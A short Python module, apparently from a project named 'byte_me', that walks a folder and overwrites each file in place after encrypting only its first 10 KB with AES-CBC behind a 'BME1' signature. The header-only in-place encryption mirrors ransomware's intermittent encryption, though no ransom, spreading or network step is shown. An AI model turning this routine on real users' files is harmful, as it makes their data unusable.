import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from byte_me.utils import log_action

def encrypt_files(key: bytes, folder: str = ".byte_me"):
    if not os.path.isdir(folder):
        print(f"Folder '{folder}' not found.")
        return

    for root, _, files in os.walk(folder):
        for name in files:
            path = os.path.join(root, name)
            _encrypt_file(path, key)

def _encrypt_file(path: str, key: bytes):
    CHUNK_SIZE = 10 * 1024
    SIGNATURE = b"BME1"  # סימן קבוע להתחלה מוצפנת

    with open(path, "rb") as f:
        data = f.read()

    header = data[:CHUNK_SIZE]
    tail   = data[CHUNK_SIZE:]

    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_header = cipher.encrypt(pad(header, AES.block_size))

    with open(path, "wb") as f:
        f.write(SIGNATURE + iv + encrypted_header + tail)

    log_action(f"Encrypted file: {path}")
